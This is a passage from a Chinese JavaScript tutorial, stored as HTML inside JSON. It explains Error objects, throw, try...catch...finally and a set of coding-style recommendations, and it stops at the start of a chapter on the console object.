引擎，对<code>Error</code>实例还提供<code>name</code>和<code>stack</code>属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有。</p>\n<ul>\n<li><strong>message</strong>：错误提示信息</li>\n<li><strong>name</strong>：错误名称（非标准属性）</li>\n<li><strong>stack</strong>：错误的堆栈（非标准属性）</li>\n</ul>\n<p>使用<code>name</code>和<code>message</code>这两个属性，可以对发生什么错误有一个大概的了解。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (error.name) {\n  console.log(error.name + &#039;: &#039; + error.message);\n}</code></pre><p><code>stack</code>属性用来查看错误发生时的堆栈。</p>\n<pre class=\"prettyprint language-javascript\"><code>function throwit() {\n  throw new Error(&#039;&#039;);\n}\n\nfunction catchit() {\n  try {\n    throwit();\n  } catch(e) {\n    console.log(e.stack); // print stack trace\n  }\n}\n\ncatchit()\n// Error\n//    at throwit (~/examples/throwcatch.js:9:11)\n//    at catchit (~/examples/throwcatch.js:3:9)\n//    at repl:1:5</code></pre><p>上面代码中，错误堆栈的最内层是<code>throwit</code>函数，然后是<code>catchit</code>函数，最后是函数的运行环境。</p>\n\n        <h2>\n            <a href='#原生错误类型' class='header-anchor'>#</a>\n            <span>原生错误类型</span>\n        </h2>\n    <p><code>Error</code>实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在<code>Error</code>的6个派生对象。</p>\n\n        <h3>\n            <a href='#SyntaxError-对象' class='header-anchor'>#</a>\n            <span>SyntaxError 对象</span>\n        </h3>\n    <p><code>SyntaxError</code>对象是解析代码时发生的语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量名错误\nvar 1a;\n// Uncaught SyntaxError: Invalid or unexpected token\n\n// 缺少括号\nconsole.log &#039;hello&#039;);\n// Uncaught SyntaxError: Unexpected string</code></pre><p>上面代码的错误，都是在语法解析阶段就可以发现，所以会抛出<code>SyntaxError</code>。第一个错误提示是“token 非法”，第二个错误提示是“字符串不符合要求”。</p>\n\n        <h3>\n            <a href='#ReferenceError-对象' class='header-anchor'>#</a>\n            <span>ReferenceError 对象</span>\n        </h3>\n    <p><code>ReferenceError</code>对象是引用一个不存在的变量时发生的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 使用一个不存在的变量\nunknownVariable\n// Uncaught ReferenceError: unknownVariable is not defined</code></pre><p>另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果或者<code>this</code>赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等号左侧不是变量\nconsole.log() = 1\n// Uncaught ReferenceError: Invalid left-hand side in assignment\n\n// this 对象不能手动赋值\nthis = 1\n// ReferenceError: Invalid left-hand side in assignment</code></pre><p>上面代码对函数<code>console.log</code>的运行结果和<code>this</code>赋值，结果都引发了<code>ReferenceError</code>错误。</p>\n\n        <h3>\n            <a href='#RangeError-对象' class='header-anchor'>#</a>\n            <span>RangeError 对象</span>\n        </h3>\n    <p><code>RangeError</code>对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是<code>Number</code>对象的方法参数超出范围，以及函数堆栈超过最大值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数组长度不得为负数\nnew Array(-1)\n// Uncaught RangeError: Invalid array length</code></pre>\n        <h3>\n            <a href='#TypeError-对象' class='header-anchor'>#</a>\n            <span>TypeError 对象</span>\n        </h3>\n    <p><code>TypeError</code>对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用<code>new</code>命令，就会抛出这种错误，因为<code>new</code>命令的参数应该是一个构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new 123\n// Uncaught TypeError: number is not a func\n\nvar obj = {};\nobj.unknownMethod()\n// Uncaught TypeError: obj.unknownMethod is not a function</code></pre><p>上面代码的第二种情况，调用对象不存在的方法，也会抛出<code>TypeError</code>错误，因为<code>obj.unknownMethod</code>的值是<code>undefined</code>，而不是一个函数。</p>\n\n        <h3>\n            <a href='#URIError-对象' class='header-anchor'>#</a>\n            <span>URIError 对象</span>\n        </h3>\n    <p><code>URIError</code>对象是 URI 相关函数的参数不正确时抛出的错误，主要涉及<code>encodeURI()</code>、<code>decodeURI()</code>、<code>encodeURIComponent()</code>、<code>decodeURIComponent()</code>、<code>escape()</code>和<code>unescape()</code>这六个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>decodeURI(&#039;%2&#039;)\n// URIError: URI malformed</code></pre>\n        <h3>\n            <a href='#EvalError-对象' class='header-anchor'>#</a>\n            <span>EvalError 对象</span>\n        </h3>\n    <p><code>eval</code>函数没有被正确执行时，会抛出<code>EvalError</code>错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。</p>\n\n        <h3>\n            <a href='#总结' class='header-anchor'>#</a>\n            <span>总结</span>\n        </h3>\n    <p>以上这6种派生错误，连同原始的<code>Error</code>对象，都是构造函数。开发者可以使用它们，手动生成错误对象的实例。这些构造函数都接受一个函数，代表错误提示信息（message）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err1 = new Error(&#039;出错了！&#039;);\nvar err2 = new RangeError(&#039;出错了，变量超出有效范围！&#039;);\nvar err3 = new TypeError(&#039;出错了，变量类型无效！&#039;);\n\nerr1.message // &quot;出错了！&quot;\nerr2.message // &quot;出错了，变量超出有效范围！&quot;\nerr3.message // &quot;出错了，变量类型无效！&quot;</code></pre>\n        <h2>\n            <a href='#自定义错误' class='header-anchor'>#</a>\n            <span>自定义错误</span>\n        </h2>\n    <p>除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nUserError.prototype = new Error();\nUserError.prototype.constructor = UserError;</code></pre><p>上面代码自定义一个错误对象<code>UserError</code>，让它继承<code>Error</code>对象。然后，就可以生成这种自定义类型的错误了。</p>\n<pre class=\"prettyprint language-javascript\"><code>new UserError(&#039;这是自定义的错误！&#039;);</code></pre>\n        <h2>\n            <a href='#throw-语句' class='header-anchor'>#</a>\n            <span>throw 语句</span>\n        </h2>\n    <p><code>throw</code>语句的作用是手动中断程序执行，抛出一个错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x &lt; 0) {\n  throw new Error(&#039;x 必须为正数&#039;);\n}\n// Uncaught ReferenceError: x is not defined</code></pre><p>上面代码中，如果变量<code>x</code>小于<code>0</code>，就手动抛出一个错误，告诉用户<code>x</code>的值不正确，整个程序就会在这里中断执行。可以看到，<code>throw</code>抛出的错误就是它的参数，这里是一个<code>Error</code>实例。</p>\n<p><code>throw</code>也可以抛出自定义错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nthrow new UserError(&#039;出错了！&#039;);\n// Uncaught UserError {message: &quot;出错了！&quot;, name: &quot;UserError&quot;}</code></pre><p>上面代码中，<code>throw</code>抛出的是一个<code>UserError</code>实例。</p>\n<p>实际上，<code>throw</code>可以抛出任何类型的值。也就是说，它的参数可以是任何值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 抛出一个字符串\nthrow &#039;Error！&#039;;\n// Uncaught Error！\n\n// 抛出一个数值\nthrow 42;\n// Uncaught 42\n\n// 抛出一个布尔值\nthrow true;\n// Uncaught true\n\n// 抛出一个对象\nthrow {\n  toString: function () {\n    return &#039;Error!&#039;;\n  }\n};\n// Uncaught {toString: ƒ}</code></pre><p>对于 JavaScript 引擎来说，遇到<code>throw</code>语句，程序就中止了。引擎会接收到<code>throw</code>抛出的信息，可能是一个错误实例，也可能是其他类型的值。</p>\n\n        <h2>\n            <a href='#try...catch-结构' class='header-anchor'>#</a>\n            <span>try...catch 结构</span>\n        </h2>\n    <p>一旦发生错误，程序就中止执行了。JavaScript 提供了<code>try...catch</code>结构，允许对错误进行处理，选择是否往下执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw new Error(&#039;出错了!&#039;);\n} catch (e) {\n  console.log(e.name + &quot;: &quot; + e.message);\n  console.log(e.stack);\n}\n// Error: 出错了!\n//   at &lt;anonymous&gt;:3:9\n//   ...</code></pre><p>上面代码中，<code>try</code>代码块抛出错误（上例用的是<code>throw</code>语句），JavaScript 引擎就立即把代码的执行，转到<code>catch</code>代码块，或者说错误被<code>catch</code>代码块捕获了。<code>catch</code>接受一个参数，表示<code>try</code>代码块抛出的值。</p>\n<p>如果你不确定某些代码是否会报错，就可以把它们放在<code>try...catch</code>代码块之中，便于进一步对错误进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  f();\n} catch(e) {\n  // 处理错误\n}</code></pre><p>上面代码中，如果函数<code>f</code>执行报错，就会进行<code>catch</code>代码块，接着对错误进行处理。</p>\n<p><code>catch</code>代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw &quot;出错了&quot;;\n} catch (e) {\n  console.log(111);\n}\nconsole.log(222);\n// 111\n// 222</code></pre><p>上面代码中，<code>try</code>代码块抛出的错误，被<code>catch</code>代码块捕获后，程序会继续向下执行。</p>\n<p><code>catch</code>代码块之中，还可以再抛出错误，甚至使用嵌套的<code>try...catch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 100;\n\ntry {\n  throw n;\n} catch (e) {\n  if (e &lt;= 50) {\n    // ...\n  } else {\n    throw e;\n  }\n}\n// Uncaught 100</code></pre><p>上面代码中，<code>catch</code>代码之中又抛出了一个错误。</p>\n<p>为了捕捉不同类型的错误，<code>catch</code>代码块之中可以加入判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  foo.bar();\n} catch (e) {\n  if (e instanceof EvalError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  } else if (e instanceof RangeError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  }\n  // ...\n}</code></pre><p>上面代码中，<code>catch</code>捕获错误之后，会判断错误类型（<code>EvalError</code>还是<code>RangeError</code>），进行不同的处理。</p>\n\n        <h2>\n            <a href='#finally-代码块' class='header-anchor'>#</a>\n            <span>finally 代码块</span>\n        </h2>\n    <p><code>try...catch</code>结构允许在最后添加一个<code>finally</code>代码块，表示不管是否出现错误，都必需在最后运行的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function cleansUp() {\n  try {\n    throw new Error(&#039;出错了……&#039;);\n    console.log(&#039;此行不会执行&#039;);\n  } finally {\n    console.log(&#039;完成清理工作&#039;);\n  }\n}\n\ncleansUp()\n// 完成清理工作\n// Error: 出错了……</code></pre><p>上面代码中，由于没有<code>catch</code>语句块，所以错误没有捕获。执行<code>finally</code>代码块以后，程序就中断在错误抛出的地方。</p>\n<pre class=\"prettyprint language-javascript\"><code>function idle(x) {\n  try {\n    console.log(x);\n    return &#039;result&#039;;\n  } finally {\n    console.log(&quot;FINALLY&quot;);\n  }\n}\n\nidle(&#039;hello&#039;)\n// hello\n// FINALLY\n// &quot;result&quot;</code></pre><p>上面代码说明，<code>try</code>代码块没有发生错误，而且里面还包括<code>return</code>语句，但是<code>finally</code>代码块依然会执行。注意，只有在其执行完毕后，才会显示<code>return</code>语句的值。</p>\n<p>下面的例子说明，<code>return</code>语句的执行是排在<code>finally</code>代码之前，只是等<code>finally</code>代码执行完毕后才返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var count = 0;\nfunction countUp() {\n  try {\n    return count;\n  } finally {\n    count++;\n  }\n}\n\ncountUp()\n// 0\ncount\n// 1</code></pre><p>上面代码说明，<code>return</code>语句的<code>count</code>的值，是在<code>finally</code>代码块运行之前就获取了。</p>\n<p>下面是<code>finally</code>代码块用法的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>openFile();\n\ntry {\n  writeFile(Data);\n} catch(e) {\n  handleError(e);\n} finally {\n  closeFile();\n}</code></pre><p>上面代码首先打开一个文件，然后在<code>try</code>代码块中写入文件，如果没有发生错误，则运行<code>finally</code>代码块关闭文件；一旦发生错误，则先使用<code>catch</code>代码块处理错误，再使用<code>finally</code>代码块关闭文件。</p>\n<p>下面的例子充分反映了<code>try...catch...finally</code>这三者之间的执行顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    console.log(0);\n    throw &#039;bug&#039;;\n  } catch(e) {\n    console.log(1);\n    return true; // 这句原本会延迟到 finally 代码块结束再执行\n    console.log(2); // 不会运行\n  } finally {\n    console.log(3);\n    return false; // 这句会覆盖掉前面那句 return\n    console.log(4); // 不会运行\n  }\n\n  console.log(5); // 不会运行\n}\n\nvar result = f();\n// 0\n// 1\n// 3\n\nresult\n// false</code></pre><p>上面代码中，<code>catch</code>代码块结束执行之前，会先执行<code>finally</code>代码块。</p>\n<p><code>catch</code>代码块之中，触发转入<code>finally</code>代码快的标志，不仅有<code>return</code>语句，还有<code>throw</code>语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    throw &#039;出错了！&#039;;\n  } catch(e) {\n    console.log(&#039;捕捉到内部错误&#039;);\n    throw e; // 这句原本会等到finally结束再执行\n  } finally {\n    return false; // 直接返回\n  }\n}\n\ntry {\n  f();\n} catch(e) {\n  // 此处不会执行\n  console.log(&#039;caught outer &quot;bogus&quot;&#039;);\n}\n\n//  捕捉到内部错误</code></pre><p>上面代码中，进入<code>catch</code>代码块之后，一遇到<code>throw</code>语句，就会去执行<code>finally</code>代码块，其中有<code>return false</code>语句，因此就直接返回了，不再会回去执行<code>catch</code>代码块剩下的部分了。</p>\n\n        <h2>\n            <a href='#参考连接' class='header-anchor'>#</a>\n            <span>参考连接</span>\n        </h2>\n    <ul>\n<li>Jani Hartikainen, <a href=\"http://davidwalsh.name/fix-javascript-errors\">JavaScript Errors and How to Fix Them</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"编程风格","link":"/features/style.html"}],"content":"\n        <h1>\n            <a href='#编程风格' class='header-anchor'>#</a>\n            <span>编程风格</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>”编程风格“（programming style）指的是编写代码的样式规则。不同的程序员，往往有不同的编程风格。</p>\n<p>有人说，编译器的规范叫做”语法规则“（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫”编程风格“（programming style），这是程序员可以自由选择的。这种说法不完全正确，程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。</p>\n<p>所以，编程风格的选择不应该基于个人爱好、熟悉程度、打字量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。这一点，对于 JavaScript 这种语法自由度很高的语言尤其重要。</p>\n<p>必须牢记的一点是，如果你选定了一种“编程风格”，就应该坚持遵守，切忌多种风格混用。如果你加入他人的项目，就应该遵守现有的风格。</p>\n\n        <h2>\n            <a href='#缩进' class='header-anchor'>#</a>\n            <span>缩进</span>\n        </h2>\n    <p>行首的空格和 Tab 键，都可以产生代码缩进效果（indent）。</p>\n<p>Tab 键可以节省击键次数，但不同的文本编辑器对 Tab 的显示不尽相同，有的显示四个空格，有的显示两个空格，所以有人觉得，空格键可以使得显示效果更统一。</p>\n<p>无论你选择哪一种方法，都是可以接受的，要做的就是始终坚持这一种选择。不要一会使用 Tab 键，一会使用空格键。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>如果循环和判断的代码体只有一行，JavaScript 允许该区块（block）省略大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a)\n  b();\n  c();</code></pre><p>上面代码的原意可能是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n  c();\n}</code></pre><p>但是，实际效果却是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n}\n  c();</code></pre><p>因此，建议总是使用大括号表示区块。</p>\n<p>另外，区块起首的大括号的位置，有许多不同的写法。最流行的有两种，一种是起首的大括号另起一行。</p>\n<pre class=\"prettyprint language-javascript\"><code>block\n{\n  // ...\n}</code></pre><p>另一种是起首的大括号跟在关键字的后面。</p>\n<pre class=\"prettyprint language-javascript\"><code>block {\n  // ...\n}</code></pre><p>一般来说，这两种写法都可以接受。但是，JavaScript 要使用后一种，因为 JavaScript 会自动添加句末的分号，导致一些难以察觉的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{\n  key: value\n};\n\n// 相当于\nreturn;\n{\n  key: value\n};</code></pre><p>上面的代码的原意，是要返回一个对象，但实际上返回的是<code>undefined</code>，因为 JavaScript 自动在<code>return</code>语句后面添加了分号。为了避免这一类错误，需要写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>return {\n  key : value\n};</code></pre><p>因此，表示区块起首的大括号，不要另起一行。</p>\n\n        <h2>\n            <a href='#圆括号' class='header-anchor'>#</a>\n            <span>圆括号</span>\n        </h2>\n    <p>圆括号（parentheses）在 JavaScript 中有两种作用，一种表示函数的调用，另一种表示表达式的组合（grouping）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 圆括号表示函数的调用\nconsole.log(&#039;abc&#039;);\n\n// 圆括号表示表达式的组合\n(1 + 2) * 3</code></pre><p>建议可以用空格，区分这两种不同的括号。</p>\n<blockquote>\n<ol>\n<li><p>表示函数调用时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>表示函数定义时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>其他情况时，前面位置的语法元素与左括号之间，都有一个空格。</p>\n</li>\n</ol>\n</blockquote>\n<p>按照上面的规则，下面的写法都是不规范的。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo (bar)\nreturn(a+b);\nif(a === 0) {...}\nfunction foo (b) {...}\nfunction(x) {...}</code></pre><p>上面代码的最后一行是一个匿名函数，<code>function</code>是语法关键字，不是函数名，所以与左括号之间应该要有一个空格。</p>\n\n        <h2>\n            <a href='#行尾的分号' class='header-anchor'>#</a>\n            <span>行尾的分号</span>\n        </h2>\n    <p>分号表示一条语句的结束。JavaScript 允许省略行尾的分号。事实上，确实有一些开发者行尾从来不写分号。但是，由于下面要讨论的原因，建议还是不要省略这个分号。</p>\n\n        <h3>\n            <a href='#不使用分号的情况' class='header-anchor'>#</a>\n            <span>不使用分号的情况</span>\n        </h3>\n    <p>首先，以下三种情况，语法规定本来就不需要在结尾添加分号。</p>\n<p><strong>（1）for 和 while 循环</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ) {\n} // 没有分号\n\nwhile (true) {\n} // 没有分号</code></pre><p>注意，<code>do...while</code>循环是有分号的。</p>\n<pre class=\"prettyprint language-javascript\"><code>do {\n  a--;\n} while(a &gt; 0); // 分号不能省略</code></pre><p><strong>（2）分支语句：if，switch，try</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n} // 没有分号\n\nswitch () {\n} // 没有分号\n\ntry {\n} catch {\n} // 没有分号</code></pre><p><strong>（3）函数的声明语句</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n} // 没有分号</code></pre><p>注意，函数表达式仍然要使用分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {\n};</code></pre><p>以上三种情况，如果使用了分号，并不会出错。因为，解释引擎会把这个分号解释为空语句。</p>\n\n        <h3>\n            <a href='#分号的自动添加' class='header-anchor'>#</a>\n            <span>分号的自动添加</span>\n        </h3>\n    <p>除了上一节的三种情况，所有语句都应该使用分号。但是，如果没有使用分号，大多数情况下，JavaScript 会自动添加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1\n// 等同于\nvar a = 1;</code></pre><p>这种语法特性被称为“分号的自动添加”（Automatic Semicolon Insertion，简称 ASI）。</p>\n<p>因此，有人提倡省略句尾的分号。麻烦的是，如果下一行的开始可以与本行的结尾连在一起解释，JavaScript 就不会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 var a = 3\nvar\na\n=\n3\n\n// 等同于 &#039;abc&#039;.length\n&#039;abc&#039;\n.length\n\n// 等同于 return a + b;\nreturn a +\nb;\n\n// 等同于 obj.foo(arg1, arg2);\nobj.foo(arg1,\narg2);\n\n// 等同于 3 * 2 + 10 * (27 / 6)\n3 * 2\n+\n10 * (27 / 6)</code></pre><p>上面代码都会多行放在一起解释，不会每一行自动添加分号。这些例子还是比较容易看出来的，但是下面这个例子就不那么容易看出来了。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = y\n(function () {\n  // ...\n})();\n\n// 等同于\nx = y(function () {...})();</code></pre><p>下面是更多不会自动添加分号的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 引擎解释为 c(d+e)\nvar a = b + c\n(d+e).toString();\n\n// 引擎解释为 a = b/hi/g.exec(c).map(d)\n// 正则表达式的斜杠，会当作除法运算符\na = b\n/hi/g.exec(c).map(d);\n\n// 解释为&#039;b&#039;[&#039;red&#039;, &#039;green&#039;]，\n// 即把字符串当作一个数组，按索引取值\nvar a = &#039;b&#039;\n[&#039;red&#039;, &#039;green&#039;].forEach(function (c) {\n  console.log(c);\n})\n\n// 解释为 function (x) { return x }(a++)\n// 即调用匿名函数，结果f等于0\nvar a = 0;\nvar f = function (x) { return x }\n(a++)</code></pre><p>只有下一行的开始与本行的结尾，无法放在一起解释，JavaScript 引擎才会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a &lt; 0) a = 0\nconsole.log(a)\n\n// 等同于下面的代码，\n// 因为 0console 没有意义\nif (a &lt; 0) a = 0;\nconsole.log(a)</code></pre><p>另外，如果一行的起首是“自增”（<code>++</code>）或“自减”（<code>--</code>）运算符，则它们的前面会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1\n\na\n++\nb\n--\nc\n\nconsole.log(a, b, c)\n// 1 2 0</code></pre><p>上面代码之所以会得到<code>1 2 0</code>的结果，原因是自增和自减运算符前，自动加上了分号。上面的代码实际上等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1;\na;\n++b;\n--c;</code></pre><p>如果<code>continue</code>、<code>break</code>、<code>return</code>和<code>throw</code>这四个语句后面，直接跟换行符，则会自动添加分号。这意味着，如果<code>return</code>语句返回的是一个对象的字面量，起首的大括号一定要写在同一行，否则得不到预期结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{ first: &#039;Jane&#039; };\n\n// 解释成\nreturn;\n{ first: &#039;Jane&#039; };</code></pre><p>由于解释引擎自动添加分号的行为难以预测，因此编写代码的时候不应该省略行尾的分号。</p>\n<p>不应该省略结尾的分号，还有一个原因。有些 JavaScript 代码压缩器（uglifier）不会自动添加分号，因此遇到没有分号的结尾，就会让代码保持原状，而不是压缩成一行，使得压缩无法得到最优的结果。</p>\n<p>另外，不写结尾的分号，可能会导致脚本合并出错。所以，有的代码库在第一行语句开始前，会加上一个分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>;var a = 1;\n// ...</code></pre><p>上面这种写法就可以避免与其他脚本合并时，排在前面的脚本最后一行语句没有分号，导致运行出错的问题。</p>\n\n        <h2>\n            <a href='#全局变量' class='header-anchor'>#</a>\n            <span>全局变量</span>\n        </h2>\n    <p>JavaScript 最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。</p>\n<p>因此，建议避免使用全局变量。如果不得不使用，可以考虑用大写字母表示变量名，这样更容易看出这是全局变量，比如<code>UPPER_CASE</code>。</p>\n\n        <h2>\n            <a href='#变量声明' class='header-anchor'>#</a>\n            <span>变量声明</span>\n        </h2>\n    <p>JavaScript 会自动将变量声明”提升“（hoist）到代码块（block）的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!x) {\n  var x = {};\n}\n\n// 等同于\nvar x;\nif (!x) {\n  x = {};\n}</code></pre><p>这意味着，变量<code>x</code>是<code>if</code>代码块之前就存在了。为了避免可能出现的问题，最好把变量声明都放在代码块的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 10; i++) {\n  // ...\n}\n\n// 写成\nvar i;\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n}</code></pre><p>上面这样的写法，就容易看出存在一个全局的循环变量<code>i</code>。</p>\n<p>另外，所有函数都应该在使用之前定义。函数内部的变量声明，都应该放在函数的头部。</p>\n\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>可以减少代码的书写，但是会造成混淆。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (o) {\n　foo = bar;\n}</code></pre><p>上面的代码，可以有四种运行结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>o.foo = bar;\no.foo = o.bar;\nfoo = bar;\nfoo = o.bar;</code></pre><p>这四种结果都可能发生，取决于不同的变量是否有定义。因此，不要使用<code>with</code>语句。</p>\n\n        <h2>\n            <a href='#相等和严格相等' class='header-anchor'>#</a>\n            <span>相等和严格相等</span>\n        </h2>\n    <p>JavaScript 有两个表示相等的运算符：”相等“（<code>==</code>）和”严格相等“（<code>===</code>）。</p>\n<p>相等运算符会自动转换变量类型，造成很多意想不到的情况。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;// true\n1 == true // true\n2 == true // false\n0 == &#039;0&#039; // true\nfalse == &#039;false&#039; // false\nfalse == &#039;0&#039; // true\n&#039; \\t\\r\\n &#039; == 0 // true</code></pre><p>因此，建议不要使用相等运算符（<code>==</code>），只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#语句的合并' class='header-anchor'>#</a>\n            <span>语句的合并</span>\n        </h2>\n    <p>有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b;\nif (a) {\n  // ...\n}</code></pre><p>他喜欢写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a = b) {\n  // ...\n}</code></pre><p>虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误解这行代码的意思是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if （a === b）{\n  // ...\n}</code></pre><p>建议不要将不同目的的语句，合并成一行。</p>\n\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增（<code>++</code>）和自减（<code>--</code>）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。事实上，所有的<code>++</code>运算符都可以用<code>+= 1</code>代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>++x\n// 等同于\nx += 1;</code></pre><p>改用<code>+= 1</code>，代码变得更清晰了。</p>\n<p>建议自增（<code>++</code>）和自减（<code>--</code>）运算符尽量使用<code>+=</code>和<code>-=</code>代替。</p>\n\n        <h2>\n            <a href='#switch...case-结构' class='header-anchor'>#</a>\n            <span>switch...case 结构</span>\n        </h2>\n    <p><code>switch...case</code>结构要求，在每一个<code>case</code>的最后一行必须是<code>break</code>语句，否则会接着运行下一个<code>case</code>。这样不仅容易忘记，还会造成代码的冗长。</p>\n<p>而且，<code>switch...case</code>不使用大括号，不利于代码形式的统一。此外，这种结构类似于<code>goto</code>语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  switch (action) {\n    case &#039;hack&#039;:\n      return &#039;hack&#039;;\n      break;\n    case &#039;slash&#039;:\n      return &#039;slash&#039;;\n      break;\n    case &#039;run&#039;:\n      return &#039;run&#039;;\n      break;\n    default:\n      throw new Error(&#039;Invalid action.&#039;);\n  }\n}</code></pre><p>上面的代码建议改写成对象结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  var actions = {\n    &#039;hack&#039;: function () {\n      return &#039;hack&#039;;\n    },\n    &#039;slash&#039;: function () {\n      return &#039;slash&#039;;\n    },\n    &#039;run&#039;: function () {\n      return &#039;run&#039;;\n    }\n  };\n\n  if (typeof actions[action] !== &#039;function&#039;) {\n    throw new Error(&#039;Invalid action.&#039;);\n  }\n\n  return actions[action]();\n}</code></pre><p>因此，建议<code>switch...case</code>结构可以用对象结构代替。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Eric Elliott, Programming JavaScript Applications, <a href=\"http://chimera.labs.oreilly.com/books/1234000000262/ch02.html\">Chapter 2. JavaScript Style Guide</a>, O&#39;Reilly, 2013</li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/07/meta-style-guide.html\">A meta style guide for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/05/semicolon-insertion.html\">Automatic semicolon insertion in JavaScript</a></li>\n<li>Rod Vagg, <a href=\"http://dailyjs.com/2012/04/19/semicolons/\">JavaScript and Semicolons</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"console 对象与控制台","link":"/features/console.html"}],"content":"\n        <h1>\n            <a href='#console-对象与控制台' class='header-anchor'>#</a>\n            <span>console 对象与控制台</span>\n        </h1>\n    \n        <h2>\n            <a href='#console-对象' class='header-anchor'>#</a>\n            <span>console 对象</span>\n        </h2>\n    <p><code>console</code>对象是 JavaScript 的原生对象，它有点像 Unix 